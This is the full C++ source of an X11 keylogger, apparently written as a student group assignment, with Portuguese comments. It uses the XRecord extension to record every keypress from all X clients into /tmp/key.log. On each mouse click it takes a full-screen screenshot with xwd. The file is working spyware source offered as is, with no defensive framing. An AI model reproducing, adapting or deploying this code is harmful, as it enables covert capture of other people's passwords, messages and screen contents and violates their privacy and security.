/**
 * Keylogger
 * Grupo A4
 *
 * Raphael Ferras Goncalves da Silva
 * Thiago Camargo Correa
 * Vinicius de Freitas Reis
 *
 * Compilar usando: g++ kl.cpp -o kl -L/usr/X11R6/lib -lXtst -lX11
 */


#include <X11/Xlibint.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/Xos.h>
#include <X11/Shell.h>
#include <X11/cursorfont.h>
#include <X11/keysymdef.h>
#include <X11/keysym.h>
#include <X11/extensions/record.h>
#include <X11/extensions/XTest.h>
#include <unistd.h>
#include <exception>
#include <string>
#include <iostream>
#include <cstdlib>

using namespace std;

struct CallbackClosure {
    Display *ctrlDisplay;
    Display *dataDisplay;
	int cliqueID;
};

typedef union {
    unsigned char type;
    xEvent event;
    xResourceReq req;
    xGenericReply reply;
    xError error;
    xConnSetupPrefix setup;
} XRecordDatum;


// nome do servidor X
string m_displayName;
// dados passados para o callback
CallbackClosure userData;
// versao da extensao
std::pair<int,int> recVer;

// variaveis necessarias usar a Record
XRecordRange *recRange;
XRecordClientSpec recClientSpec;
XRecordContext recContext;

void configura() {
	// Deixa o X no modo sincrono -> mostra
	// mensagens de erro imediatamente
	XSynchronize(userData.ctrlDisplay, True);

	// Verifica se a extensao Record esta instalada
	if (!XRecordQueryVersion (userData.ctrlDisplay, &recVer.first, &recVer.second)) {
		cout << "A extensao RECORD nao esta carregada no servidor X."<< endl;
		throw exception();
	}

	// Aloca o range de eventos capturados
	recRange = XRecordAllocRange ();
	if (!recRange) {
		// "Could not alloc record range object!\n";
		throw exception();
	}
	recRange->device_events.first = KeyPress;
	recRange->device_events.last = ButtonPress;
	// Registra eventos de todos os clientes
	// conectados ao servidor X
	recClientSpec = XRecordAllClients;
	userData.cliqueID = 0;

	// Inicializa a Record
	recContext = XRecordCreateContext (userData.ctrlDisplay, 0, &recClientSpec, 1, &recRange, 1);
	if (!recContext) {
		cout << "Nao foi possivel inicializar a Record." << endl;
		throw exception();
	}
}

// Callback, chamado quando um evento é capturado
static void eventCallback(XPointer closure, XRecordInterceptData *recorded_data) {
	char *s;
	CallbackClosure *uData = (CallbackClosure *)closure;
	XRecordDatum *data = (XRecordDatum *) recorded_data->data;

	if (recorded_data->category != XRecordFromServer) {
		XRecordFreeData(recorded_data);
		return;
	}

	if (data->event.u.u.type == KeyPress) {
		int c = data->event.u.u.detail; // Keycode da tecla
		FILE *log = fopen("/tmp/key.log", "a+"); // abre o arquivo de log
		
		// traduz a tecla em string
		s = XKeysymToString(XKeycodeToKeysym(uData->ctrlDisplay, c, 0));
		
		if (strlen(s) > 1) // caracter de controle
			fprintf(log,"[%s]\n", s);
		else // letra
			fprintf(log, "%s", s);

		fflush(log);
		fclose(log);
	} else if (data->event.u.u.type == ButtonPress) {
		char buf[255];

		// registra no log o momento do clique
		FILE *log = fopen("/tmp/key.log", "a+");
		fprintf(log, "[clique %d]\n", uData->cliqueID);
		fclose(log);
		
		// grava a screenshot
		sprintf(buf, "xwd -root -display :0 > /tmp/%d.xwd", uData->cliqueID++);
		system(buf);
	}

	XRecordFreeData(recorded_data);
}

bool conecta(string displayName) {
	m_displayName = displayName;

	// tenta conectar no servidor X
	if (NULL == (userData.ctrlDisplay = XOpenDisplay(m_displayName.c_str())) )
		return false;
	
	if (NULL == (userData.dataDisplay = XOpenDisplay(m_displayName.c_str())) ) {
		XCloseDisplay(userData.ctrlDisplay);
		userData.ctrlDisplay = NULL;
		return false;
	}

	configura();
	return true;
}


int main() {
    if ( conecta(":0") ) {
		if (!XRecordEnableContext (userData.dataDisplay, recContext, eventCallback, (XPointer) &userData)) {
			throw exception();
		}
    } else {
		cout << "Nao foi possivel conectar no servidor X :0"<< endl;
	}
    return 0;
}
